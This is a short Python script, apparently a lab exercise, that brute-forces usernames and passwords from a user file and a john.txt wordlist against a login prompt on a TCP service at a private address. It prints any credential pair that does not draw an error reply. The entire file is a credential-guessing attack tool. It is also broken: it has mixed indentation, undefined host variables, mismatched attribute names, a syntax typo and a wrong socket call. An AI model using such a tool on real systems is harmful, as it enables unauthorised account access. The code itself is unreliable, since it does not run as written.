import socket


class GuessC:

	def __init__(self):
		self.host = "192.168.0.6"
		self.port = "1503"
		self.users = "users.txt"
		self.dict = "john.txt"


	def recv_to(self, string, sock):
		data= ""
		while True:
			tmp = sock.recv(1)
			if tmp == "":
				break
			data += tmp
			if data.endswith(string):
				break
		if data is not "":
			return data
		else:
			return None


	def try_login(self):
		soc = socket.socket((socket.AF_INET, socket.SOCK_STREAM))
    	soc.connect((WEB_CONTROL_HOST, WEB_CONTROL_PORT))
    	rep = None
    	pas = None
    	with open(self.user_file) as u_f:
    		for line in u_f:
    			with open(self.dict) ad p_f:
    				for p_line in p_f:
				    	reply = recv_to("Enter login: ", soc)
				    	soc.send(line)
				    	reply = recv_to("Enter Password: ", soc)
				    	soc.send(p_line)
				    	reply = soc.recv(1024)
				    	if "Error!" not in reply:
				    		rep = line.rstrip("\n")
				    		pas = p_line.rstrip("\n")  	
		soc.close()
		return rep, pas

	def printit(self):
		if self.try_login()[0] is not None:
			print("!!! FOUND IT: ", self.try_login()[0], "-", self.try_login()[1])
		else:
			print("did not find any creds")




if __name__ == "__main__":
	fc = GuessC()
	fc.printit()


